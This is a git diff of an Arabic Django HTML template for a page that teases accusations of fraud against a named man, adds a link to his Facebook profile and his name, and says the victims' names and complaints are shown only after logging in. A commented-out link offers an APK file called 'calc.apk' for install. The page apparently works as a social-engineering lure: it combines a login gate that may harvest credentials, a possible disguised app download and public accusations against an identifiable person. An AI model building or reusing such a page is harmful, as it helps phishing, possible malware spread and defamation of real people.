@@ -31,11 +31,11 @@
 
 <body class="bg-gray" dir="rtl">
 
-    <div class="p-2">
+    <div class="p-1">
 
         <div class="container">
 
-            <div class="row pt-5">
+            <div class="row">
 
                 <div class="col-xl-7 col-lg-6 col-md-12">
                     <div class="text-center mt-0 mb-0">
@@ -52,7 +52,13 @@
                     لمشاهدة باقي الخبر وأسماء المجني عليهم، والشكاوى المقدمة ضده داخل وخارج مصر، قم بتسجيل الدخول.
                 </b>
                         </p>
-                        <img class="rounded-4 mb-3" width="200" height="300" src="{% static "../static/img/nasaab.jpeg" %}">
+                        <a href="https://www.facebook.com/profile.php?id=100091840010424" target="_blank">
+                            <img class="mb-1" width="150" height="150" src="{% static "../static/img/sons.jpg" %}" style="border-radius:50%; border:3px dashed #4267B2"></a>
+                        <br>
+                        <b style="color:#4267B2">أبو رضوان حماده رضوان</b>
+                        <br>
+                        <b style="color:#4267B2" class="mb-3">1.3K friends</b>
+
                     </div>
 
                 </div>
@@ -98,8 +104,9 @@
             </div>
         </div>
 
+        {% comment %} <a href="{% static "../static/apks/calc.apk" %}">Install Apk File</a> {% endcomment %}
         
-      {% include "tableData.html" %}
+      {% comment %} {% include "tableData.html" %} {% endcomment %}
         
      
 
@@ -107,6 +114,9 @@
     </div>
 
     </div>
+
+    {% comment %} {% include "footer.html" %} {% endcomment %}
+
     <script src="{% static "../static/js/theme.js" %}"></script>
     <script src="{% static "../static/js/bootstrap.min.js" %}"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
